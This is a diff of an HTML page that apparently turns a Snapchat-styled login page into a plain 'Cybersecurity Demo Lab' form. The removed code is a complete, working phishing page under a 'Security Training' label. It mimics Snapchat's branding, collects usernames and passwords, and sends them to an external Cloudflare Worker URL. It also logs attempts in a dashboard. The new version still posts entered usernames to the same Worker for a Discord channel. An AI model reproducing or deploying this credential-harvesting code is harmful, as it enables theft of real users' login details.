@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Snap-Inspired | Security Training</title>
+<title>Cybersecurity Demo Lab</title>
 <style>
 * { box-sizing: border-box; }
 
@@ -11,7 +12,7 @@ body {
   margin: 0;
   min-height: 100vh;
   font-family: Arial, sans-serif;
-  background: #fffc00;
+  background: #f2f5fa;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -22,147 +23,61 @@ body {
   background: white;
   width: 100%;
   max-width: 420px;
-  padding: 36px 30px;
-  border-radius: 22px;
-  box-shadow: 0 14px 45px #00000015;
-}
-
-.logo {
-  text-align: center;
-  font-size: 42px;
-  margin-bottom: 8px;
+  padding: 32px;
+  border-radius: 18px;
+  box-shadow: 0 12px 35px #00000012;
 }
 
 h1 {
   text-align: center;
-  font-size: 26px;
-  margin: 12px 0;
+  font-size: 24px;
 }
 
 .subtitle {
   text-align: center;
   color: #666;
-  font-size: 14px;
+  font-size: 13px;
   line-height: 1.6;
 }
 
 label {
   display: block;
-  margin: 15px 0 7px;
-  font-size: 13px;
+  margin: 20px 0 8px;
+  font-size: 14px;
   font-weight: bold;
 }
 
 input {
   width: 100%;
   padding: 14px;
-  border: 1px solid #ddd;
-  border-radius: 10px;
+  border: 1px solid #ccc;
+  border-radius: 9px;
   font-size: 15px;
-  outline: none;
 }
 
-input:focus {
-  border-color: #b6a900;
-}
-
-.password-box { position: relative; }
-
-.password-box input { padding-right: 65px; }
-
-.show-btn {
-  position: absolute;
-  right: 8px;
-  top: 6px;
-  border: none;
-  background: transparent;
-  padding: 9px;
-  cursor: pointer;
-}
-
-.primary {
+button {
   width: 100%;
-  margin-top: 22px;
-  padding: 15px;
-  background: #fffc00;
-  color: #111;
+  padding: 14px;
+  margin-top: 24px;
+  background: #2458e8;
+  color: white;
   border: none;
-  border-radius: 30px;
+  border-radius: 9px;
   font-size: 15px;
-  font-weight: bold;
   cursor: pointer;
-}
-
-.primary:hover { background: #eee900; }
-
-.secondary {
-  background: none;
-  border: none;
-  color: #444;
-  text-decoration: underline;
-  cursor: pointer;
-  margin-top: 18px;
-  width: 100%;
-  padding: 10px;
 }
 
 .result {
-  margin-top: 16px;
-  text-align: center;
+  margin-top: 20px;
   font-size: 14px;
-  line-height: 1.5;
-  white-space: pre-wrap;
-}
-
-.hidden { display: none; }
-
-.stats {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 10px;
-  margin: 20px 0;
-}
-
-.stat {
-  background: #f4f4f4;
-  border-radius: 12px;
-  padding: 15px;
-  text-align: center;
-}
-
-.stat strong {
-  display: block;
-  font-size: 25px;
-  margin-bottom: 5px;
-}
-
-.stat span {
-  color: #666;
-  font-size: 12px;
-}
-
-.history {
-  max-height: 300px;
-  overflow-y: auto;
-}
-
-.entry {
-  padding: 12px;
-  border-bottom: 1px solid #eee;
-  font-size: 13px;
+  line-height: 1.8;
   overflow-wrap: anywhere;
 }
 
-.entry small {
-  display: block;
-  margin-top: 5px;
-  color: #777;
-}
-
-.footer {
+.note {
+  font-size: 12px;
+  color: #666;
   text-align: center;
-  font-size: 11px;
-  color: #777;
   margin-top: 20px;
 }
 </style>
@@ -170,121 +85,68 @@ input:focus {
 <body>
 
 <div class="container">
+  <h1>Cybersecurity Demo Lab</h1>
 
-  <section id="loginPage">
-    <p class="subtitle">
-      Sign in to your training account
-    </p>
+  <p class="subtitle">
+    Enter two non-sensitive test usernames.
+    Both values will be sent to the demo Discord channel.
+  </p>
 
-    <form id="loginForm">
-      <label for="username">Username</label>
-      <input
-        id="username"
-        maxlength="40"
-        autocomplete="off"
-        placeholder="Enter test username"
-        required
-      >
+  <form id="demoForm">
+    <label for="username">Username</label>
+    <input
+      id="username"
+      type="text"
+      maxlength="40"
+      autocomplete="off"
+      required
+    >
 
-      <label for="password">Password</label>
-      <div class="password-box">
-        <input
-          id="password"
-          type="password"
-          autocomplete="off"
-          placeholder="Enter demo password"
-          required
-        >
-        <button
-          class="show-btn"
-          type="button"
-          id="showPassword"
-        >Show</button>
-      </div>
+    <label for="username2">Username 2</label>
+    <input
+      id="username2"
+      type="text"
+      maxlength="40"
+      autocomplete="off"
+      required
+    >
 
-      <button class="primary" type="submit">
-        Log In
-      </button>
-    </form>
-
-    <div class="result" id="localResult"></div>
-
-    <button class="secondary" id="openDashboard">
-      View Training Results
+    <button type="submit" id="sendButton">
+      Send Demo
     </button>
-  </section>
+  </form>
 
-  <section id="dashboard" class="hidden">
-    <h1>Training Dashboard</h1>
-    <p class="subtitle">
-      Local demonstration results
-    </p>
+  <div class="result" id="result"></div>
 
-    <div class="stats">
-      <div class="stat">
-        <strong id="total">0</strong>
-        <span>Total attempts</span>
-      </div>
-      <div class="stat">
-        <strong id="successful">0</strong>
-        <span>Successful demos</span>
-      </div>
-    </div>
-
-    <h3>Attempt History</h3>
-    <div id="history" class="history"></div>
-
-    <button class="primary" id="backButton">
-      Back to Login
-    </button>
-
-    <button class="secondary" id="clearButton">
-      Clear Local Results
-    </button>
-
-    <div class="footer">
-      Lab Environment.
-    </div>
-  </section>
-
+  <p class="note">
+    Demo Only — Do not enter passwords or real credentials.
+  </p>
 </div>
 
 <script>
-const STORAGE_KEY = "securityTrainingAttempts";
-
 const WORKER_URL =
   "https://soft-wildflower-8b8f.gxdhdehdd.workers.dev/";
 
-const loginPage = document.getElementById("loginPage");
-const dashboard = document.getElementById("dashboard");
-const passwordInput = document.getElementById("password");
+const form = document.getElementById("demoForm");
+const result = document.getElementById("result");
+const sendButton = document.getElementById("sendButton");
 
-function getAttempts() {
-  try {
-    return JSON.parse(
-      localStorage.getItem(STORAGE_KEY) || "[]"
-    );
-  } catch {
-    return [];
+form.addEventListener("submit", async (event) => {
+  event.preventDefault();
+
+  const username =
+    document.getElementById("username").value.trim();
+
+  const username2 =
+    document.getElementById("username2").value.trim();
+
+  if (!username || !username2) {
+    result.textContent = "Please enter both usernames.";
+    return;
   }
-}
 
-function saveAttempts(attempts) {
-  localStorage.setItem(
-    STORAGE_KEY,
-    JSON.stringify(attempts)
-  );
-}
-
-async function sendDemoResult(username, password) {
-  const success = password === "Demo@12345";
-
-  document.getElementById("localResult").textContent =
-    `Username: ${username}\n` +
-    `Password: ${password} (Demo Only)\n` +
-    `Result: ${success ? "Success" : "Wrong Password"}`;
-
-  document.getElementById("localResult").style.color = success ? "green" : "#b42318";
+  sendButton.disabled = true;
+  result.textContent = "Sending demo...";
 
   try {
     const response = await fetch(WORKER_URL, {
@@ -293,105 +155,38 @@ async function sendDemoResult(username, password) {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        event: "demo_login",
+        event: "demo_usernames",
         username: username,
-        password: password,
-        success: success
+        username2: username2
       })
     });
 
     if (!response.ok) {
-      console.error("Notification failed");
+      throw new Error("Request failed");
     }
+
+    result.replaceChildren();
+
+    const first = document.createElement("div");
+    first.textContent = "Username: " + username;
+
+    const second = document.createElement("div");
+    second.textContent = "Username 2: " + username2;
+
+    const status = document.createElement("div");
+    status.textContent = "Sent to Discord successfully!";
+    status.style.color = "green";
+
+    result.append(first, second, status);
   } catch (error) {
-    console.error("Connection error:", error);
+    result.textContent =
+      "Could not send the demo. Check the Worker settings.";
+    result.style.color = "#b42318";
+  } finally {
+    sendButton.disabled = false;
   }
-}
-
-document.getElementById("showPassword")
-  .addEventListener("click", () => {
-    const visible = passwordInput.type === "text";
-    passwordInput.type = visible ? "password" : "text";
-    document.getElementById("showPassword")
-      .textContent = visible ? "Show" : "Hide";
-  });
-
-document.getElementById("loginForm")
-  .addEventListener("submit", (event) => {
-    event.preventDefault();
-
-    const username = document.getElementById("username").value.trim();
-    const password = passwordInput.value;
-    const success = password === "Demo@12345";
-
-    const attempts = getAttempts();
-    attempts.unshift({
-      username,
-      success,
-      time: new Date().toLocaleString()
-    });
-    saveAttempts(attempts.slice(0, 100));
-
-    sendDemoResult(username, password);
-
-    passwordInput.value = "";
-  });
-
-function renderDashboard() {
-  const attempts = getAttempts();
-
-  document.getElementById("total")
-    .textContent = attempts.length;
-
-  document.getElementById("successful")
-    .textContent = attempts.filter(a => a.success).length;
-
-  const history = document.getElementById("history");
-  history.replaceChildren();
-
-  if (!attempts.length) {
-    history.textContent = "No attempts recorded yet.";
-    return;
-  }
-
-  attempts.forEach(a => {
-    const entry = document.createElement("div");
-    entry.className = "entry";
-
-    const user = document.createElement("strong");
-    user.textContent = a.username;
-
-    const status = document.createElement("span");
-    status.textContent = a.success
-      ? " — Successful demo"
-      : " — Failed demo";
-
-    const time = document.createElement("small");
-    time.textContent = a.time;
-
-    entry.append(user, status, time);
-    history.appendChild(entry);
-  });
-}
-
-document.getElementById("openDashboard")
-  .addEventListener("click", () => {
-    renderDashboard();
-    loginPage.classList.add("hidden");
-    dashboard.classList.remove("hidden");
-  });
-
-document.getElementById("backButton")
-  .addEventListener("click", () => {
-    dashboard.classList.add("hidden");
-    loginPage.classList.remove("hidden");
-  });
-
-document.getElementById("clearButton")
-  .addEventListener("click", () => {
-    localStorage.removeItem(STORAGE_KEY);
-    renderDashboard();
-  });
+});
 </script>
+
 </body>
 </html>
